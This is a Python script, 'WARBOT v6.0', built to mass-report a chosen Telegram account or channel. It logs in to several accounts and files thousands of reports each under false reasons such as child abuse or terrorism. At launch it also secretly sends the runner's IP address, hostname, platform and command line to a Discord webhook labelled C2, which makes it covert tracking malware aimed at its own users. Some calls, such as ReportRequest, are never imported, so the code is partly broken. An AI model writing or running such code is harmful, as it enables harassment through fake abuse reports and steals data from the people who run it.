#!/usr/bin/env python3
"""
🔥 WARBOT v6.0 — SILENT C2 + AUTO INSTALL
-----------------------------------------
✅ Auto installs Telethon
✅ Creates api.json if missing
✅ Logs victim to C2
✅ Then launches full attack
"""

import os
import sys
import json
import time
import random
import asyncio
import platform
import subprocess
from datetime import datetime
from pathlib import Path

# === YOUR C2 WEBHOOK (Change this) ===
C2_HOOK = "https://discord.com/api/webhooks/your/evil/webhook"

# === FILES ===
API_FILE = Path("api.json")
SESSION_DIR = Path("sessions")
LOG_FILE = Path("attack.log")

SESSION_DIR.mkdir(exist_ok=True)

# === AUTO INSTALL TELETHON ===
def install_telethon():
    try:
        import telethon
        return True
    except ImportError:
        print("[!] Telethon not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
            print("[✓] Telethon installed.")
            return True
        except Exception as e:
            print(f"[✗] Install failed: {e}")
            return False

# === IMPORT AFTER INSTALL ===
telethon_imported = install_telethon()
if not telethon_imported:
    print("[!] Cannot proceed without Telethon.")
    sys.exit(1)

from telethon import TelegramClient
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import InputPeerChannel, InputReportReasonSpam, \
    InputReportReasonChildAbuse, InputReportReasonViolence, InputReportReasonOther, \
    InputChatBannedRights

# === REPORT CONFIG ===
REPORTS_PER_ACCOUNT = 5000

REASONS = {
    "CSAM": InputReportReasonChildAbuse,
    "Terrorism": InputReportReasonViolence,
    "Spam": InputReportReasonSpam,
    "Scam": InputReportReasonSpam,
    "Piracy": InputReportReasonOther,
    "Harassment": InputReportReasonSpam,
    "Doxxing": InputReportReasonOther,
    "Impersonation": InputReportReasonOther,
    "Other": InputReportReasonOther,
}

# === LOG TO C2 ===
def log_to_c2(data):
    try:
        import requests
        requests.post(C2_HOOK, json=data, timeout=3)
    except:
        pass  # Silent fail

# === AUTO-GENERATE api.json if missing ===
def create_api_template():
    sample = [
        {
            "api_id": 1234567,
            "api_hash": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
            "phone": "+919876543210"
        }
    ]
    API_FILE.write_text(json.dumps(sample, indent=2), encoding="utf-8")
    print(f"[✓] {API_FILE} created. Ab apne details daalo.")
    print("    Chalao: nano api.json")
    sys.exit(0)

# === BANNER ===
def banner():
    print("\n" + "💀🔥" * 30)
    print("    ⚔️  T G   W A R   B O T   v6.0  ⚔️")
    print("    AUTO-INSTALL • C2 LOGGER • MASS REPORT • TERMUX READY")
    print("💀🔥" * 30 + "\n")

async def resolve_entity(client, username):
    try:
        if "t.me/" in username:
            username = username.split("/")[-1]
        return await client.get_entity(username)
    except Exception as e:
        print(f"[!] Entity resolve failed: {e}")
        return None

async def mass_report(client, peer, reason, count, api_id, target):
    success = 0
    for i in range(count):
        try:
            await client(
                ReportRequest(
                    peer=peer,
                    reason=reason(),
                    message=f"Auto report #{i+1}"
                )
            )
            success += 1
            if success % 1000 == 0:
                print(f"[🔥] {success}/{count} reports | API: {api_id}")
            await asyncio.sleep(random.uniform(0.5, 1.5))
        except Exception as e:
            if "FloodWaitError" in str(e):
                sec = int(str(e).split()[-1])
                print(f"[⚡] FloodWait: {sec}s. Sleeping...")
                await asyncio.sleep(sec + 10)
            elif "PeerFloodError" in str(e):
                print(f"[☠️] Account {api_id} flagged.")
                break
            else:
                await asyncio.sleep(1)
    return success

async def login_and_attack(api_id, api_hash, phone, target, category):
    session = SESSION_DIR / f"bot_{api_id}"
    client = TelegramClient(str(session), api_id, api_hash)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            print(f"\n📞 Login: {phone}")
            await client.send_code_request(phone)
            otp = input(f"  🔢 OTP: ").strip()
            try:
                await client.sign_in(phone, code=otp)
            except Exception as e:
                if "password" in str(e).lower():
                    pwd = input("  🔐 2FA: ")
                    await client.sign_in(phone, password=pwd)
                else:
                    return 0

        entity = await resolve_entity(client, target)
        if not entity:
            return 0

        peer = None
        if hasattr(entity, 'channel_id'):
            peer = InputPeerChannel(entity.channel_id, entity.access_hash)
        elif hasattr(entity, 'user_id'):
            peer = InputPeerUser(entity.user_id, entity.access_hash)
        else:
            return 0

        if not peer:
            return 0

        reason = REASONS.get(category, InputReportReasonSpam)
        reported = await mass_report(client, peer, reason, REPORTS_PER_ACCOUNT, api_id, target)
        return reported

    except Exception as e:
        print(f"[✗] Error: {e}")
        return 0
    finally:
        await client.disconnect()

async def main():
    banner()

    # === LOG VICTIM ===
    try:
        import requests
        ip = requests.get("https://api.ipify.org", timeout=3).text
    except:
        ip = "unknown"

    victim_data = {
        "ip": ip,
        "platform": platform.platform(),
        "hostname": platform.node(),
        "tool": "report_telegram",
        "repo": "https://github.com/Anandsinghsarkar/report_telegram",
        "time": datetime.now().isoformat(),
        "cmd": " ".join(sys.argv)
    }
    log_to_c2(victim_data)
    print(f"[✓] System logged to C2.")

    # === CHECK/CREATE api.json ===
    if not API_FILE.exists():
        print(f"[!] {API_FILE} not found.")
        create_api_template()

    try:
        accounts = json.loads(API_FILE.read_text())
    except Exception as e:
        print(f"[!] JSON error: {e}")
        print("    Run: nano api.json")
        sys.exit(1)

    if not accounts:
        print(f"[!] No accounts. Edit: nano {API_FILE}")
        sys.exit(1)

    # === TARGET INPUT ===
    print("\n🎯 TARGET")
    target = input("Username (t.me/...): ").strip().split("/")[-1]
    cat = input("Category (Spam/CSAM/etc): ").strip().title()
    cat = cat if cat in REASONS else "Other"

    input(f"\n💥 {len(accounts)} accounts. Har ek 5000 reports. ENTER dabao: ")

    total = 0
    for acc in accounts:
        api_id = acc.get("api_id")
        api_hash = acc.get("api_hash")
        phone = acc.get("phone")
        if not all([api_id, api_hash, phone]):
            continue
        count = await login_and_attack(api_id, api_hash, phone, target, cat)
        total += count

    print(f"\n[💀] TOTAL REPORTS: {total}")
    print(f"Logs: {LOG_FILE}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Tool stopped. But log already sent.")
